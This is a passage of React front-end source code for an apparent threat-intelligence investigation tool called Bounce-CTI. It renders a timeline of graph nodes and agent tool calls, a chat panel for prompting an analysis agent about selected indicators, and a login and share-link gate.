                for (const e of entries) {
                  if (e._kind === 'tool') {
                    const prev = merged[merged.length - 1]
                    if (prev && prev._kind === 'tools') {
                      prev.tools.push(e)
                    } else {
                      merged.push({ _kind: 'tools', ts: e.ts, tools: [e] })
                    }
                  } else {
                    merged.push(e)
                  }
                }
                if (merged.length === 0) return <p className="hint">No nodes yet.</p>
                const selectedId = selected?.id
                return (
                  <div className="timeline-list">
                    {merged.map((tn, i) => {
                      const tsStr = tn.ts ? new Date(tn.ts * 1000).toLocaleTimeString() : '?'
                      if (tn._kind === 'node') {
                        const color = NODE_COLORS[tn.type] || '#8b949e'
                        const isSel = tn.id === selectedId
                        return (
                          <div
                            key={tn.id}
                            ref={el => { if (el && isSel) el.scrollIntoView({ behavior: 'smooth', block: 'center' }) }}
                            className={`timeline-entry${isSel ? ' selected' : ''}`}
                            onClick={() => focusNode(tn.id)}
                            title="Click to focus this node on the graph"
                          >
                            <div className="timeline-line">
                              <span className="timeline-dot" style={{ background: color }} />
                              {i < merged.length - 1 && <span className="timeline-connector" />}
                            </div>
                            <div className="timeline-content">
                              <div className="timeline-header">
                                <span className="timeline-time">{tsStr}</span>
                                <span className="timeline-type" style={{ color }}>{tn.type}</span>
                                {tn.sources_seen.length >= 2 && (
                                  <span className="timeline-src-count" title={`Seen by: ${tn.sources_seen.join(', ')}`}>
                                    {tn.sources_seen.length} sources
                                  </span>
                                )}
                              </div>
                              <div className="timeline-value">
                                {tn.value.length > 50 ? tn.value.slice(0, 48) + '...' : tn.value}
                              </div>
                              {tn.first_seen && (
                                <div className="timeline-first-seen">
                                  ext. first seen: {String(tn.first_seen).slice(0, 19)}
                                </div>
                              )}
                              {tn.tags.length > 0 && (
                                <div style={{ display: 'flex', gap: 3, flexWrap: 'wrap', marginTop: 2 }}>
                                  {tn.tags.slice(0, 4).map(t => (
                                    <span key={t} className={`tag-chip tag-${t}`} style={{ fontSize: 9, padding: '0 4px' }}>{t}</span>
                                  ))}
                                </div>
                              )}
                            </div>
                          </div>
                        )
                      }
                      if (tn._kind === 'reasoning') {
                        const isExp = expandedReasoning.has(i)
                        return (
                          <div key={`note-${i}`} className="timeline-entry timeline-note">
                            <div className="timeline-line">
                              <span className="timeline-dot timeline-dot-note" />
                              {i < merged.length - 1 && <span className="timeline-connector" />}
                            </div>
                            <div className="timeline-content">
                              <div
                                className={`timeline-note-text${isExp ? ' expanded' : ''}`}
                                title={isExp ? 'Click to collapse' : 'Click to expand full reasoning'}
                                onClick={() => setExpandedReasoning(prev => {
                                  const next = new Set(prev)
                                  if (next.has(i)) next.delete(i); else next.add(i)
                                  return next
                                })}
                              >{tn.text}</div>
                            </div>
                          </div>
                        )
                      }
                      if (tn._kind === 'tools') {
                        return (
                          <div key={`tools-${i}`} className="timeline-entry timeline-tool-group">
                            <div className="timeline-line">
                              <span className="timeline-dot timeline-dot-tool" />
                              {i < merged.length - 1 && <span className="timeline-connector" />}
                            </div>
                            <div className="timeline-content">
                              <div className="timeline-header">
                                <span className="timeline-time">{tsStr}</span>
                              </div>
                              <div className="timeline-tools">
                                {tn.tools.map((t, j) => (
                                  <span key={j} className="timeline-tool-chip" title={t.detail || ''}>
                                    {t.text}
                                  </span>
                                ))}
                              </div>
                            </div>
                          </div>
                        )
                      }
                      // Modification entries: node updates, tag changes, report updates.
                      if (tn._kind === 'node_updated' || tn._kind === 'node_tagged' || tn._kind === 'report_updated') {
                        const isReport = tn._kind === 'report_updated'
                        const color = isReport
                          ? '#f5a623'
                          : (NODE_COLORS[tn.nodeType] || '#79c0ff')
                        const label = tn._kind === 'report_updated'
                          ? '✎ report updated'
                          : tn._kind === 'node_tagged'
                            ? '+ tag'
                            : '✎ updated'
                        return (
                          <div
                            key={`mod-${i}`}
                            className={`timeline-entry timeline-mod${tn.nodeId ? ' clickable' : ''}`}
                            onClick={tn.nodeId ? () => focusNode(tn.nodeId) : undefined}
                            title={tn.nodeId ? 'Click to focus this node' : undefined}
                          >
                            <div className="timeline-line">
                              <span className="timeline-dot timeline-dot-mod" style={{ background: color }} />
                              {i < merged.length - 1 && <span className="timeline-connector" />}
                            </div>
                            <div className="timeline-content">
                              <div className="timeline-header">
                                <span className="timeline-time">{tsStr}</span>
                                <span className="timeline-mod-label" style={{ color }}>{label}</span>
                                {tn.nodeType && tn._kind !== 'report_updated' && (
                                  <span className="timeline-type" style={{ color }}>{tn.nodeType}</span>
                                )}
                              </div>
                              <div className="timeline-value">
                                {tn.text && tn.text.length > 60 ? tn.text.slice(0, 58) + '…' : tn.text}
                              </div>
                            </div>
                          </div>
                        )
                      }
                      return null
                    })}
                  </div>
                )
              })()}
            </>
          )}
          {/* ── Actions tab — operational deliverables ── */}
          {rightTab === 'actions' && (
            <ActionsPanel
              activeInv={activeInv}
              graphReady={!!cyRef.current && cyRef.current.nodes().length > 0}
            />
          )}
          {/* ── Chat tab ── */}
          {rightTab === 'chat' && (
            <div className="chat-container">
              <div className="chat-messages">
                {(!report || !Array.isArray(report.prompt_history) || report.prompt_history.length === 0) && (
                  <div className="chat-empty">
                    <div className="chat-empty-icon">💬</div>
                    <div>No conversation yet.</div>
                    <div style={{ color: 'var(--on-dim)', fontSize: 11 }}>
                      {activeInv ? 'Type a question below to ask the agent.' : 'Open an investigation to start chatting.'}
                    </div>
                  </div>
                )}
                {report && Array.isArray(report.prompt_history) && report.prompt_history.map((entry, i) => (
                  <React.Fragment key={i}>
                    <div className="chat-msg user">
                      {entry.selected_nodes && entry.selected_nodes.length > 0 && (
                        <div className="chat-selected-nodes">
                          {entry.selected_nodes.map((v, j) => (
                            <span key={j} className="ioc-chip small">{iocString(v)}</span>
                          ))}
                        </div>
                      )}
                      <div className="chat-bubble">{typeof entry === 'string' ? entry : iocString(entry.prompt)}</div>
                      {entry.timestamp && (
                        <div className="chat-meta">{new Date(entry.timestamp).toLocaleTimeString()}</div>
                      )}
                    </div>
                    {entry.response && (
                      <div className="chat-msg agent">
                        <div className="chat-bubble">
                          <HighlightedText text={entry.response} nodeValues={nodeValues} onNodeClick={focusNode} />
                        </div>
                        {(entry.nodes_added > 0 || entry.nodes_updated > 0) && (
                          <div className="chat-nodes-badge">
                            {entry.nodes_added > 0 && `+${entry.nodes_added} nodes`}
                            {entry.nodes_updated > 0 && ` ~${entry.nodes_updated} updated`}
                          </div>
                        )}
                      </div>
                    )}
                  </React.Fragment>
                ))}
                {pendingPrompt && (
                  <div className="chat-msg user">
                    {pendingPrompt.selectedNodes && pendingPrompt.selectedNodes.length > 0 && (
                      <div className="chat-selected-nodes">
                        {pendingPrompt.selectedNodes.map((v, j) => (
                          <span key={j} className="ioc-chip small">{v.type}: {v.value}</span>
                        ))}
                      </div>
                    )}
                    <div className="chat-bubble">{pendingPrompt.text}</div>
                    <div className="chat-meta">{new Date(pendingPrompt.timestamp).toLocaleTimeString()}</div>
                  </div>
                )}
                {promptBusy && (
                  <div className="chat-thinking">
                    <div className="chat-dot" />
                    <div className="chat-dot" />
                    <div className="chat-dot" />
                  </div>
                )}
                <div ref={chatEndRef} />
              </div>
              {activeInv && (
                <div className="chat-prompt">
                  {pickedIds.size > 0 && (
                    <div className="prompt-selected-nodes">
                      <span className="prompt-selected-label">
                        Selected ({pickedIds.size})
                        {pickedIds.size >= 6 && (
                          <span className="prompt-selected-warn" title="Big bulk prompts can hit agent rate limits or time-budget — split if it stalls.">
                            · {pickedIds.size} nodes · long run
                          </span>
                        )}:
                      </span>
                      <div className="prompt-selected-chips">
                        {(() => {
                          const cy = cyRef.current
                          if (!cy) return null
                          const chips = []
                          cy.nodes().forEach(n => {
                            if (pickedIds.has(n.id())) {
                              const d = n.data()
                              if (d.type !== 'report') {
                                chips.push(
                                  <span key={n.id()} className="prompt-chip" style={{ borderColor: NODE_COLORS[d.type] || '#8b949e' }}>
                                    <span className="prompt-chip-type">{d.type}</span>
                                    {d.value?.length > 30 ? d.value.slice(0, 28) + '…' : d.value}
                                  </span>
                                )
                              }
                            }
                          })
                          return chips
                        })()}
                      </div>
                    </div>
                  )}
                  <textarea
                    className="custom-prompt-input"
                    value={customPrompt}
                    onChange={e => setCustomPrompt(e.target.value)}
                    placeholder={pickedIds.size > 0
                      ? `Ask about these ${pickedIds.size} selected node(s)… (Ctrl+Enter)`
                      : 'Ask the agent anything about this investigation… (Ctrl+Enter)'}
                    rows={2}
                    onKeyDown={e => { if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) submitCustomPrompt() }}
                  />
                  <button
                    className="auth-btn"
                    disabled={promptBusy || !customPrompt.trim()}
                    onClick={submitCustomPrompt}
                    style={{ marginTop: 4, width: '100%' }}
                  >
                    {promptBusy ? 'Agent is thinking…' : (pickedIds.size > 0
                      ? `Ask about ${pickedIds.size} selected →`
                      : 'Send →')}
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
        {/* Custom prompt — pinned at bottom of right panel (hidden when Chat tab active) */}
        {activeInv && rightTab !== 'chat' && (
          <div className="custom-prompt-section">
            {pickedIds.size > 0 && (
              <div className="prompt-selected-nodes">
                <span className="prompt-selected-label">Selected ({pickedIds.size}):</span>
                <div className="prompt-selected-chips">
                  {(() => {
                    const cy = cyRef.current
                    if (!cy) return null
                    const chips = []
                    cy.nodes().forEach(n => {
                      if (pickedIds.has(n.id())) {
                        const d = n.data()
                        if (d.type !== 'report') {
                          chips.push(
                            <span key={n.id()} className="prompt-chip" style={{ borderColor: NODE_COLORS[d.type] || '#8b949e' }}>
                              <span className="prompt-chip-type">{d.type}</span>
                              {d.value?.length > 30 ? d.value.slice(0, 28) + '…' : d.value}
                            </span>
                          )
                        }
                      }
                    })
                    return chips
                  })()}
                </div>
              </div>
            )}
            <textarea
              className="custom-prompt-input"
              value={customPrompt}
              onChange={e => setCustomPrompt(e.target.value)}
              placeholder={pickedIds.size > 0
                ? `Instruct the agent about these ${pickedIds.size} selected node(s)… (Ctrl+Enter)`
                : 'Prompt the agent: dig deeper, re-analyze, check specific IOCs… (Ctrl+Enter)'}
              rows={2}
              onKeyDown={e => { if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) submitCustomPrompt() }}
            />
            <button
              className="auth-btn"
              disabled={promptBusy || !customPrompt.trim()}
              onClick={submitCustomPrompt}
              style={{ marginTop: 4, width: '100%' }}
            >
              {promptBusy ? 'Sending…' : (pickedIds.size > 0
                ? `Run on ${pickedIds.size} selected →`
                : 'Run prompt →')}
            </button>
          </div>
        )}
      </div>
    </div>
    {/* Modals live OUTSIDE .app on purpose. On mobile, .sidebar/.details
        get a `transform` (slide-in drawers), which makes them a containing
        block for any descendant `position: fixed` element — so a modal
        rendered inside .details stays glued to the (offscreen) drawer
        instead of covering the viewport. Hoisting them up to the root
        Fragment side-steps that. */}
    {adminOpen && <AdminPanel onClose={() => setAdminOpen(false)} selfId={userId} onImpersonate={() => window.location.reload()} />}
    {shareOpen && activeInv && (() => {
      const inv = invs.find(i => i.id === activeInv)
      return inv ? <ShareModal inv={inv} onClose={() => setShareOpen(false)} /> : null
    })()}
    </>
  )
}

// Read the ?share=<token> query param once at boot. The shared graph viewer
// short-circuits the normal auth flow — anonymous analysts can review a
// colleague's link, and logged-in ones get an Import button on the same page.
function readShareToken() {
  if (typeof window === 'undefined') return null
  try {
    const sp = new URLSearchParams(window.location.search)
    const t = sp.get('share')
    return t && t.length >= 8 ? t : null
  } catch (_) { return null }
}

export default function AppRoot() {
  const [shareToken] = useState(() => readShareToken())
  const [authState, setAuthState] = useState('checking')
  const [me, setMe] = useState(null)
  useEffect(() => {
    if (shareToken) return // SharedView handles its own auth probe
    fetch('/api/auth/me', { credentials: 'same-origin' })
      .then(r => r.ok ? r.json() : null)
      .then(data => { if (data) { setMe(data); setAuthState('authed') } else { setMe(null); setAuthState('needed') } })
      .catch(() => { setMe(null); setAuthState('needed') })
  }, [shareToken])

  if (shareToken) {
    return <SharedView token={shareToken} />
  }
  const logout = async () => {
    try { await fetch('/api/auth/logout', { method: 'POST' }) } catch (e) { /* ignore */ }
    setMe(null)
    setAuthState('needed')
  }
  if (authState === 'checking') {
    return (
      <div className="auth-screen">
        <div className="auth-card">
          <span className="logo-mark logo-mark-auth" role="img" aria-label="Bounce-CTI" />
          <div className="logo">BOUNCE<span>CTI</span></div>
        </div>
      </div>
    )
  }
  if (authState === 'needed') {
    return <Login onAuth={() => fetch('/api/auth/me', { credentials: 'same-origin' }).then(r => r.ok ? r.json() : null).then(data => { if (data) { setMe(data); setAuthState('authed') } })} />
  }
  return <MainApp
    onLogout={logout}
    isAdmin={!!me?.is_admin}
    allowedModels={me?.allowed_models || null}
    userId={me?.user_id}
  />
}
